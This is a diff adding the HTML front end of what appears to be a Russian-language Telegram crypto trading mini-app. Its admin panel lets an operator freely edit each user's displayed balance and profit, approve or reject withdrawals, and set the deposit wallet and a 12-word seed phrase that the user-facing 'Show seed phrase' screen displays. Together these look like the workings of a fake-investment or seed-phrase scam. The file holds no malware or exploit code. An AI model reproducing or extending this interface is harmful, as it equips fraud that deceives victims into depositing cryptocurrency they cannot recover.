@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Crypto Trading App</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="app.js"></script>
+</head>
+
+<body>
+    <div class="app-container">
+        <!-- Profile Screen -->
+        <div id="screen-profile" class="screen active">
+            <div class="profile-header">
+                <div class="avatar">АИ</div>
+                <div class="user-name" id="user-name">—</div>
+                <div class="user-email" id="user-email">—</div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Баланс</div>
+                    <div class="stat-value">$<span id="balance">—</span></div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-label">Прибыль</div>
+                    <div class="stat-value profit">+$<span id="profit"></span></div>
+                </div>
+            </div>
+
+            <div class="menu-list">
+                <button class="menu-item" onclick="showScreen('wallet')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon wallet">💳</div>
+                        <span class="menu-item-text">Кошелек</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+                <a href="https://t.me/support_username" id="supplink" class="menu-item" style="text-decoration: none;">
+                    <div class="menu-item-left">
+                        <div class="menu-icon support">💬</div>
+                        <span class="menu-item-text">Служба поддержки</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </a>
+            </div>
+        </div>
+
+        <!-- Wallet Screen -->
+        <div id="screen-wallet" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('profile')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Кошелек</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="wallet-balance">
+                <div class="wallet-balance-label">Общий баланс</div>
+                <div class="wallet-balance-value">$<span id="wallet-balance">-</span></div>
+            </div>
+
+            <div class="wallet-actions">
+                <button class="btn btn-primary" onclick="showScreen('deposit')">
+                    <span>↓</span> Пополнить
+                </button>
+                <button class="btn btn-secondary" onclick="showScreen('withdraw')">
+                    <span>↑</span> Вывод
+                </button>
+            </div>
+
+            <div class="section-title">История транзакций</div>
+            <div class="transaction-list">
+                <div class="transaction-item">
+                    <div class="transaction-left">
+                        <div class="transaction-icon deposit">↓</div>
+                        <div class="transaction-info">
+                            <span class="transaction-type">Пополнение</span>
+                            <span class="transaction-date">15 янв 2024, 14:32</span>
+                        </div>
+                    </div>
+                    <div class="transaction-right">
+                        <div class="transaction-amount positive">+$5,000.00</div>
+                        <span class="transaction-status status-completed">Выполнено</span>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div class="transaction-left">
+                        <div class="transaction-icon withdraw">↑</div>
+                        <div class="transaction-info">
+                            <span class="transaction-type">Вывод</span>
+                            <span class="transaction-date">12 янв 2024, 09:15</span>
+                        </div>
+                    </div>
+                    <div class="transaction-right">
+                        <div class="transaction-amount negative">-$1,200.00</div>
+                        <span class="transaction-status status-completed">Выполнено</span>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div class="transaction-left">
+                        <div class="transaction-icon deposit">↓</div>
+                        <div class="transaction-info">
+                            <span class="transaction-type">Пополнение</span>
+                            <span class="transaction-date">10 янв 2024, 18:45</span>
+                        </div>
+                    </div>
+                    <div class="transaction-right">
+                        <div class="transaction-amount positive">+$3,000.00</div>
+                        <span class="transaction-status status-pending">В обработке</span>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div class="transaction-left">
+                        <div class="transaction-icon withdraw">↑</div>
+                        <div class="transaction-info">
+                            <span class="transaction-type">Вывод</span>
+                            <span class="transaction-date">08 янв 2024, 11:20</span>
+                        </div>
+                    </div>
+                    <div class="transaction-right">
+                        <div class="transaction-amount negative">-$500.00</div>
+                        <span class="transaction-status status-rejected">Отклонено</span>
+                    </div>
+                </div>
+                <div class="transaction-item">
+                    <div class="transaction-left">
+                        <div class="transaction-icon deposit">↓</div>
+                        <div class="transaction-info">
+                            <span class="transaction-type">Пополнение</span>
+                            <span class="transaction-date">05 янв 2024, 20:00</span>
+                        </div>
+                    </div>
+                    <div class="transaction-right">
+                        <div class="transaction-amount positive">+$2,150.00</div>
+                        <span class="transaction-status status-completed">Выполнено</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Deposit Screen -->
+        <div id="screen-deposit" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('wallet')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Пополнение</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="deposit-info">
+                <span class="network-badge">USDT TRC20</span>
+
+                <div class="qr-placeholder">QR Code</div>
+
+                <div class="address-label">Адрес кошелька</div>
+                <div class="address-value" id="wallet-address">-</div>
+            </div>
+
+            <button class="btn btn-primary btn-full" onclick="copyAddress()">
+                📋 Скопировать адрес
+            </button>
+        </div>
+
+        <!-- Withdraw Screen -->
+        <div id="screen-withdraw" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('wallet')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Вывод средств</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div id="withdraw-form">
+                <div class="wallet-balance" style="margin-bottom: 24px;">
+                    <div class="wallet-balance-label">Доступно для вывода</div>
+                    <div class="wallet-balance-value">$<span id="free-balance">12,450.00</span></div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Сумма вывода</label>
+                    <input type="number" class="form-input" placeholder="0.00" id="withdraw-amount">
+                    <div class="balance-hint">Минимум: $50.00 | Комиссия: 1%</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Адрес кошелька (USDT TRC20)</label>
+                    <input type="text" class="form-input" placeholder="Введите адрес кошелька" id="withdraw-address">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Способ вывода</label>
+                    <input type="text" class="form-input" value="Криптобиржа" disabled>
+                </div>
+
+                <button class="btn btn-primary btn-full" onclick="confirmWithdraw()" style="margin-top: 24px;">
+                    Подтвердить вывод
+                </button>
+            </div>
+
+            <div id="withdraw-status" class="hidden">
+                <div class="payment-status">
+                    <div class="payment-status-icon">⏳</div>
+                    <div class="payment-status-text">Платёж в обработке</div>
+                    <p style="color: var(--text-secondary); margin-top: 12px; font-size: 14px;">
+                        Ваша заявка на вывод принята и будет обработана в течение 24 часов.
+                    </p>
+                </div>
+                <button class="btn btn-secondary btn-full" onclick="showScreen('wallet')" style="margin-top: 24px;">
+                    Вернуться в кошелек
+                </button>
+            </div>
+        </div>
+
+        <!-- Market Screen -->
+        <div id="screen-market" class="screen">
+            <div class="market-header">
+                <h1 class="market-title">Маркет</h1>
+            </div>
+
+            <div class="asset-list" id="asset-list">
+            </div>
+        </div>
+
+        <!-- Trade Screen -->
+        <div id="screen-trade" class="screen">
+            <div class="market-header">
+                <h1 class="market-title">Торговать</h1>
+            </div>
+
+            <div class="trade-toggle-container">
+                <div class="toggle-wrapper">
+                    <span class="toggle-label">Активировать SMART CONTRACT</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="trade-toggle" onchange="toggleTrading()">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <div id="trade-status" class="trade-status inactive">
+                    🔴 Торговля остановлена
+                </div>
+            </div>
+
+            <div class="trade-section-title">Доступные рынки</div>
+            <div class="asset-list" id="trade-assets">
+                <div class="asset-item">
+                    <div class="asset-name">Криптовалюта</div>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="trade-toggle-crypto" onchange="toggleCrypto()">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <div class="asset-item">
+                    <div class="asset-name">Фондовый рынок</div>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="trade-toggle-stock" onchange="toggleStock()" disabled>
+                        <span class="toggle-slider inactive" id="stock-locker"></span>
+                    </label>
+                </div>
+                <div class="asset-item">
+                    <div class="asset-name">Товаро-сырьевой рынок</div>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="trade-toggle-commodity" onchange="toggleCommodities()" disabled>
+                        <span class="toggle-slider inactive" id="commodities-locker"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- Settings Screen -->
+        <div id="screen-settings" class="screen">
+            <div class="market-header">
+                <h1 class="market-title">Настройки</h1>
+            </div>
+
+            <div class="settings-section">
+                <div class="settings-label">Безопасность</div>
+                <div class="menu-list">
+                    <button class="menu-item" onclick="showScreen('seed-phrase')">
+                        <div class="menu-item-left">
+                            <div class="menu-icon seed">🔐</div>
+                            <span class="menu-item-text">Показать Seed-фразу</span>
+                        </div>
+                        <span class="menu-arrow">›</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="settings-section admin-only" id="admin-section">
+                <div class="settings-label">Панель администратора</div>
+                <div class="menu-list">
+                    <button class="menu-item" onclick="showScreen('admin-panel')">
+                        <div class="menu-item-left">
+                            <div class="menu-icon admin">⚙️</div>
+                            <span class="menu-item-text">Панель управления</span>
+                        </div>
+                        <span class="menu-arrow">›</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Seed Phrase Screen -->
+        <div id="screen-seed-phrase" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('settings')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Seed-фраза</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="seed-warning">
+                <div class="seed-warning-title">
+                    ⚠️ Внимание!
+                </div>
+                <div class="seed-warning-text">
+                    Никогда не сообщайте свою seed-фразу никому. Любой, кто получит доступ к вашей seed-фразе, сможет
+                    управлять вашими средствами.
+                </div>
+            </div>
+
+            <div class="seed-phrase-box">
+                <div class="seed-words" id="seed-words">
+                    <div class="seed-word"><span>1. </span>-</div>
+                    <div class="seed-word"><span>2. </span>-</div>
+                    <div class="seed-word"><span>3. </span>-</div>
+                    <div class="seed-word"><span>4. </span>-</div>
+                    <div class="seed-word"><span>5. </span>-</div>
+                    <div class="seed-word"><span>6. </span>-</div>
+                    <div class="seed-word"><span>7. </span>-</div>
+                    <div class="seed-word"><span>8. </span>-</div>
+                    <div class="seed-word"><span>9. </span>-</div>
+                    <div class="seed-word"><span>10.</span>-</div>
+                    <div class="seed-word"><span>11.</span>-</div>
+                    <div class="seed-word"><span>12.</span>-</div>
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <label class="checkbox-item">
+                    <input type="checkbox" id="check1">
+                    <span class="checkbox-text">Я понимаю, что никогда не должен сообщать свою seed-фразу никому,
+                        включая службу поддержки.</span>
+                </label>
+                <label class="checkbox-item">
+                    <input type="checkbox" id="check2">
+                    <span class="checkbox-text">Я сохранил seed-фразу в безопасном месте.</span>
+                </label>
+            </div>
+
+            <button class="btn btn-primary btn-full" onclick="copySeedPhrase()" style="margin-bottom: 12px;">
+                📋 Скопировать Seed-фразу
+            </button>
+            <button class="btn btn-secondary btn-full" onclick="showScreen('settings')">
+                OK
+            </button>
+        </div>
+
+        <!-- Admin Panel Screen -->
+        <div id="screen-admin-panel" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('settings')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Панель управления</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="menu-list">
+                <button class="menu-item" onclick="showScreen('admin-users')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon users">👥</div>
+                        <span class="menu-item-text">Пользователи</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+                <button class="menu-item" onclick="showScreen('admin-withdrawals')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon withdraw">💸</div>
+                        <span class="menu-item-text">Заявки на вывод</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+                <button class="menu-item" onclick="showScreen('admin-support')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon support">💬</div>
+                        <span class="menu-item-text">Support</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+                <button class="menu-item" onclick="showScreen('admin-wallets')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon wallets">👛</div>
+                        <span class="menu-item-text">Кошельки</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+                <button class="menu-item" onclick="showScreen('admin-logs')">
+                    <div class="menu-item-left">
+                        <div class="menu-icon logs">📋</div>
+                        <span class="menu-item-text">Логи</span>
+                    </div>
+                    <span class="menu-arrow">›</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Admin Users Screen -->
+        <div id="screen-admin-users" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-panel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Пользователи</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="search-box">
+                <svg class="search-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2">
+                    <circle cx="11" cy="11" r="8" />
+                    <path d="M21 21l-4.35-4.35" />
+                </svg>
+                <input type="text" class="search-input" placeholder="Поиск пользователей..." id="user-search"
+                    oninput="filterUsers()">
+            </div>
+
+            <div class="menu-list" id="users-list">
+            </div>
+        </div>
+
+        <!-- Admin User Edit Screen -->
+        <div id="screen-admin-user-edit" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-users')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Редактирование</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="user-edit-form">
+                <div class="form-group">
+                    <label class="form-label">Имя</label>
+                    <input type="text" class="form-input" id="edit-name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email</label>
+                    <input type="email" class="form-input" id="edit-email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Баланс ($)</label>
+                    <input type="number" class="form-input" id="edit-balance">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Прибыль ($)</label>
+                    <input type="number" class="form-input" id="edit-profit">
+                </div>
+                <button class="btn btn-primary btn-full" onclick="saveUser()" style="margin-top: 24px;">
+                    Сохранить изменения
+                </button>
+            </div>
+        </div>
+
+        <!-- Admin Withdrawals Screen -->
+        <div id="screen-admin-withdrawals" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-panel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Заявки на вывод</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div id="withdrawals-list">
+                <div class="request-item">
+                    <div class="request-header">
+                        <span class="request-user">Иван Петров</span>
+                        <span class="request-amount">$2,500.00</span>
+                    </div>
+                    <div class="request-details">
+                        <p>📧 ivan.petrov@email.com</p>
+                        <p>💳 TXrF7u5JdpJnPMGxkRwaBDvuYPHxjpGRm9</p>
+                        <p>📅 15 янв 2024, 14:32</p>
+                    </div>
+                    <div class="request-actions">
+                        <button class="btn btn-success btn-sm">Одобрить</button>
+                        <button class="btn btn-danger btn-sm">Отклонить</button>
+                    </div>
+                </div>
+                <div class="request-item">
+                    <div class="request-header">
+                        <span class="request-user">Мария Сидорова</span>
+                        <span class="request-amount">$1,800.00</span>
+                    </div>
+                    <div class="request-details">
+                        <p>📧 maria.s@email.com</p>
+                        <p>💳 TYk8nXjP9mRq5KwLzVuT3FhGdEcBaJsNm2</p>
+                        <p>📅 14 янв 2024, 18:15</p>
+                    </div>
+                    <div class="request-actions">
+                        <button class="btn btn-success btn-sm">Одобрить</button>
+                        <button class="btn btn-danger btn-sm">Отклонить</button>
+                    </div>
+                </div>
+                <div class="request-item">
+                    <div class="request-header">
+                        <span class="request-user">Алексей Козлов</span>
+                        <span class="request-amount">$5,000.00</span>
+                    </div>
+                    <div class="request-details">
+                        <p>📧 a.kozlov@email.com</p>
+                        <p>💳 TQn4Gk7mJrPx2VsLwYuH8FdEcBaKsNm9T5</p>
+                        <p>📅 13 янв 2024, 09:45</p>
+                    </div>
+                    <div class="request-actions">
+                        <button class="btn btn-success btn-sm">Одобрить</button>
+                        <button class="btn btn-danger btn-sm">Отклонить</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Admin Support Screen -->
+        <div id="screen-admin-support" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-panel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Support</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Telegram Username поддержки</label>
+                <input type="text" class="form-input" placeholder="@support_username" id="support-username"
+                    value="@support_username">
+            </div>
+            <button class="btn btn-primary btn-full" onclick="saveSupport()" style="margin-top: 16px;">
+                Сохранить
+            </button>
+        </div>
+
+        <div id="screen-admin-wallets" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-panel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Кошельки</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Кошелёк (адрес)</label>
+                <input type="text" class="form-input" id="wallet-address-sett" placeholder="Введите адрес кошелька">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Сид-фраза (12 слов)</label>
+                <div class="seed-phrase-grid" id="seed-phrase-fields"></div>
+            </div>
+            <button class="btn btn-primary btn-full" onclick="saveWalletSettings()" style="margin-top: 24px;">
+                Сохранить
+            </button>
+        </div>
+
+        <!-- Admin Logs Screen -->
+        <div id="screen-admin-logs" class="screen">
+            <div class="header">
+                <button class="header-back" onclick="showScreen('admin-panel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7" />
+                    </svg>
+                    Назад
+                </button>
+                <span class="header-title">Логи</span>
+                <div style="width: 60px;"></div>
+            </div>
+
+            <div class="menu-list" id="logs-list">
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 14:32:15</div>
+                    <div class="log-message">Пользователь вошел в систему</div>
+                    <div class="log-user">ivan.petrov@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 14:30:22</div>
+                    <div class="log-message">Создана заявка на вывод $2,500</div>
+                    <div class="log-user">ivan.petrov@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 13:45:08</div>
+                    <div class="log-message">Активирован Smart Contract</div>
+                    <div class="log-user">maria.s@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 12:20:33</div>
+                    <div class="log-message">Пополнение баланса +$5,000</div>
+                    <div class="log-user">alex.k@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 11:15:44</div>
+                    <div class="log-message">Просмотр seed-фразы</div>
+                    <div class="log-user">ivan.petrov@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">15 янв 2024, 10:05:12</div>
+                    <div class="log-message">Регистрация нового пользователя</div>
+                    <div class="log-user">new.user@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">14 янв 2024, 23:45:55</div>
+                    <div class="log-message">Деактивирован Smart Contract</div>
+                    <div class="log-user">maria.s@email.com</div>
+                </div>
+                <div class="log-item">
+                    <div class="log-time">14 янв 2024, 22:30:18</div>
+                    <div class="log-message">Изменен адрес кошелька</div>
+                    <div class="log-user">alex.k@email.com</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav" id="bottom-nav">
+            <button class="nav-item active" data-tab="profile" onclick="switchTab('profile')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                    <circle cx="12" cy="7" r="4" />
+                </svg>
+                <span>Профиль</span>
+            </button>
+            <button class="nav-item" data-tab="market" onclick="switchTab('market')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M3 3v18h18" />
+                    <path d="M18 17V9" />
+                    <path d="M13 17V5" />
+                    <path d="M8 17v-3" />
+                </svg>
+                <span>Маркет</span>
+            </button>
+            <button class="nav-item" data-tab="trade" onclick="switchTab('trade')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
+                </svg>
+                <span>Торговать</span>
+            </button>
+            <button class="nav-item" data-tab="settings" onclick="switchTab('settings')">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="3" />
+                    <path
+                        d="M12 1v2m0 18v2M4.22 4.22l1.42 1.42m12.72 12.72l1.42 1.42M1 12h2m18 0h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42" />
+                </svg>
+                <span>Настройки</span>
+            </button>
+        </nav>
+
+        <!-- Toast -->
+        <div class="toast" id="toast"></div>
+    </div>
+
+</body>
+
+</html>
